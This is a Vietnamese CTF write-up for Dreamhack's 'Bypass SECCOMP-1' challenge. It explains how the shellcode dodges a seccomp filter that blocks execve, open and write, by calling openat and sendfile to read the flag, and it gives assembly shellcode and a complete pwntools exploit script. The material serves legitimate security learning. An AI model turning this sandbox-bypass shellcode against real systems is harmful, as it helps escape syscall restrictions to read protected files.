# Challenge Dreamhack
[*Bypass SECCOMP-1*](https://dreamhack.io/wargame/challenges/361)

# Phân tích code

<img width="882" height="600" alt="image" src="https://github.com/user-attachments/assets/e3432aff-b0e9-429e-ac9a-0d3cace38d27" />

Chương trình cho phép nhập shellcode vào vùng nhớ có quyền `rwx` và chạy shellcode đó. Nhũng đồng thời cũng có hàm `sandbox` gọi *seccomp* để lọc các hàm syscall.

Kiểm tra *seccomp*:

<img width="766" height="329" alt="image" src="https://github.com/user-attachments/assets/d90f4284-e061-4e06-8d86-74647d92b125" />

Ở đây các hàm được liệt kê trên sẽ bị cấm. Còn lại các hàm khác vẫn được sử dụng. 
- Tất cả biến thể của `execve` đều bị chặn nên không thể tạo shell.
- Hàm `open` và `write` cũng bị chặn. Tuy nhiên vẫn còn các hàm và biến thể khác để mở file và in dữ liệu ra màn hình nên vẫn có thể đọc flag.

# Khai thác
<img width="1010" height="217" alt="image" src="https://github.com/user-attachments/assets/68abf30b-fd16-4970-82bc-720edf48c45d" />

<br><br>
Đầu tiên về vấn đề mở file thì `open` có một biến thể khác là `openat`. Khác biệt lớn nhất là khi tìm đường dẫn đến file. `open` sẽ luôn lấy thư mục hiện tại làm điểm bắt đầu (đường dẫn tương đối), còn `openat` có thể lấy từ gốc `/` (đường dẫn tuyệt đối). 

Vì mục tiêu của chúng ta chỉ là flag nằm trong thư mục hiện tại nên cần setup `openat` nhận đường dẫn tương đối qua tham số `AT_FDCWD`.

Shellcode mở file:

    mov rax, 113668128124718  --> */flag\00*
    push rax
    mov rax, 257             
    mov rdi, -100            //AT_FDCWD
    mov rsi, rsp
    xor rdx, rdx
    xor r10, r10
    syscall

File đã dược mở bây giờ cần in ra màn hình. Nhưng vì thiếu `write` nên ta sẽ dùng hàm khác để in.

<img width="1026" height="186" alt="image" src="https://github.com/user-attachments/assets/0b7119a4-c733-4910-b982-6c4d4c44010b" />

<br><br>
Hàm `sendfile`: Sao chép dữ liệu giữa 2 file descriptor (fd).

Shellcode in dữ liệu:

    mov rsi, rax        //fd in
    mov rax, 40
    mov rdi, 1          //fd out
    xor rdx, rdx
    mov r10, 0x100
    syscall

## Script Python

    #!/usr/bin/env python3
    
    from pwn import *
    
    exe = ELF("./bypass_seccomp_patched")
    libc = ELF("./libc.so.6")
    ld = ELF("./ld-2.35.so")
    
    context.binary = exe
    p=remote('host3.dreamhack.games',13417)
    
    shellcode=asm('''
        mov rax, 113668128124718
        push rax
        mov rax, 257
        mov rdi, -100
        mov rsi, rsp
        xor rdx, rdx
        xor r10, r10
        syscall
    
        mov rsi, rax
        mov rax, 40
        mov rdi, 1
        xor rdx, rdx
        mov r10, 0x100
        syscall
        ''', arch='amd64')
    
    p.sendafter(b'shellcode: ',shellcode)
    
    p.interactive()
